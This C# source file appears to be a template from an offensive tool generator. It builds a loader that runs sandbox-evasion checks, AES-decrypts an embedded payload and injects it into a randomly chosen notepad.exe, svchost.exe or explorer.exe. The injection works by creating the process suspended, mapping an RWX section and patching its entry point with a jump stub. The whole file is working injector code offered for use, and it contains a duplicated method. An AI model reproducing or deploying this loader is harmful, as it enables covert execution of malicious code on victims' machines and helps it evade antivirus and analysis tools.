using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace BY
{

    [ComVisible(true)]
    public class Program
    {
    {{CheckCPUlMemoryLang}}
    {{CheckHardDiskSpace}}
    {{CheckMACAddress}}
    {{CheckProcess}}
    {{ChecksleepAcceleration}}
    {{CheckStartTime}}
	private static string GetProcess(string file, string args = "")
        {
            Process process = new Process();
            process.StartInfo.FileName = file;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = args;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }
		private static string GetProcess(string file, string args = "")
		{
			Process process = new Process();
			process.StartInfo.FileName = file;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.Arguments = args;
			process.Start();
			string output = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			process.Close();
			return output;
		}
		
         public static string CheckNet(string str1,string str2, string domainname="baidu.com")
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://"+ domainname);
                request.Method = "HEAD";
                request.Timeout = 8000;
                try
                {
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                    return str1;
                }
                catch (WebException e)
                {
                    try
                    {
                        IPAddress[] ipAddresses = Dns.GetHostAddresses(domainname);
                        if (ipAddresses != null)
                        {
                            return str2;
                        }
                    }
                    catch (ArgumentNullException)
                    {
                        Environment.Exit(-1);
                    }
                }
                return "";
            }

        public static byte[] Decrypt(string bs, string keys)
        {
            var bytesToBeDecrypted = Convert.FromBase64String(bs);
            byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(keys));
            byte[] decryptedBytes = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes("{{Salt}}");

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        static void Main(string[] args)
        {
    {{CheckCPUlMemoryLang_RUN}}
    {{CheckHardDiskSpace_RUN}}
    {{CheckMACAddress_RUN}}
    {{CheckProcess_RUN}}
    {{ChecksleepAcceleration_RUN}}
    {{CheckStartTime_RUN}}

            string str1 = "{{context1}}";
            string str2 = "{{context2}}";
            string str = str1 != "" ? (str2 != "" ? CheckNet(str1, str2) : str1) : (str2 != "" ? str2 : "");
            if (str=="")
            {
                Environment.Exit(-1);
            }        
            List<string> pro = new List<string>(Encoding.UTF8.GetString(Convert.FromBase64String("bm90ZXBhZC5leGUsc3ZjaG9zdC5leGUsZXhwbG9yZXIuZXhl")).Split(','));
            Random r = new Random();
            var hw = new Hollwing();
            hw.Run(pro[r.Next(0, 3)], Decrypt(str, "{{keyText}}"));
        }
    }
    public class Hollwing
    {
        public IntPtr section;
        public IntPtr localmap;
        public IntPtr remotemap;
        public IntPtr localsize;
        public IntPtr remotesize;
        public IntPtr pModBase;
        public IntPtr pEntry;
        public uint rvaEntryOffset;
        public uint size;
        public byte[] inner;
        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        private const ulong PatchSize = 0x10;


        #region struct

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr reserved1;
            public IntPtr pebAddress;
            public IntPtr reserved2;
            public IntPtr reserved3;
            public IntPtr uniquePid;
            public IntPtr moreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSINFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct SYSTEMINFO
        {
            internal ushort wProcessorArchitecture;
            internal ushort wReserved;
            internal uint dwPageSize;
            internal IntPtr lpMinimumApplicationAddress;
            internal IntPtr lpMaximumApplicationAddress;
            internal IntPtr dwActiveProcessorMask;
            internal uint dwNumberOfProcessors;
            internal uint dwProcessorType;
            internal uint dwAllocationGranularity;
            internal ushort wProcessorLevel;
            internal ushort wProcessorRevision;
        }

        public struct LARGEINTEGER
        {
            public uint lowPart;
            public int highPart;
        }
        #endregion

        #region API 

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGEINTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEMINFO lpSysInfo);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESSINFORMATION lpProcInformation);
        #endregion

        public Hollwing()
        {
            section = new IntPtr();
            localmap = new IntPtr();
            remotemap = new IntPtr();
            localsize = new IntPtr();
            remotesize = new IntPtr();
            inner = new byte[0x1000];
        }
        public static PROCESSINFORMATION StartPro(string srcbin)
        {

            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESSINFORMATION procInfo = new PROCESSINFORMATION();
            CreateProcess((IntPtr)0, srcbin, (IntPtr)0,
                (IntPtr)0, false, CreateSuspended, (IntPtr)0,
                (IntPtr)0, ref startInfo, out procInfo);
            return procInfo;
        }

        public void Run(string srcbin, byte[] bytes)
        {
            var pROCESSINFORMATION = StartPro(srcbin);
            CreateSec((uint)bytes.Length);
            GetContext(pROCESSINFORMATION.hProcess);
            WriteMap(pROCESSINFORMATION, bytes);
            ResumeThread(pROCESSINFORMATION.hThread);
        }

        private void WriteMap(PROCESSINFORMATION pInfo, byte[] bytes)
        {
            KeyValuePair<IntPtr, IntPtr> local = MapSection(GetCurrentProcess(),
                PageReadWriteExecute, IntPtr.Zero);
            localmap = local.Key;
            localsize = local.Value;

            long lsize = size;
            unsafe
            {
                byte* p = (byte*)localmap;

                for (int i = 0; i < bytes.Length; i++)
                {
                    p[i] = bytes[i];
                }
            }

            KeyValuePair<IntPtr, IntPtr> remote = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            remotemap = remote.Key;
            remotesize = remote.Value;

            KeyValuePair<int, IntPtr> patch = BuildPatch(remote.Key);

            try
            {
                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();
                WriteProcessMemory(pInfo.hProcess, pEntry, patch.Value, pSize, out tPtr);
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }
            byte[] tbuf = new byte[0x1000];
            IntPtr nRead = new IntPtr();
            ReadProcessMemory(pInfo.hProcess, pEntry, tbuf, 1024, out nRead);
        }

        private KeyValuePair<int, IntPtr> BuildPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
            unsafe
            {
                byte* p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size;

            long status = ZwMapViewOfSection(section, procHandle, ref baseAddr,
                (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }


        private IntPtr GetContext(IntPtr hProcess)
        {
            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            long success = ZwQueryInformationProcess(hProcess, 0,
                ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.pebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.pebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProcess, readLoc, addrBuf, addrBuf.Length, out nRead);

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase = readLoc;

            ReadProcessMemory(hProcess, readLoc, inner, inner.Length, out nRead);

            return GetBufferPtr(inner);
        }

        private IntPtr GetBufferPtr(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase.ToInt64() + tmp);
                }
            }

            pEntry = res;
            return res;
        }

        public bool CreateSec(uint si)
        {
            LARGEINTEGER liVal = new LARGEINTEGER();
            size = Roundpage(si);
            liVal.lowPart = size;
            long status = ZwCreateSection(ref section, GenericAll,
                (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
            return status > 0;
        }

        private uint Roundpage(uint size)
        {
            SYSTEMINFO info = new SYSTEMINFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }
    }

}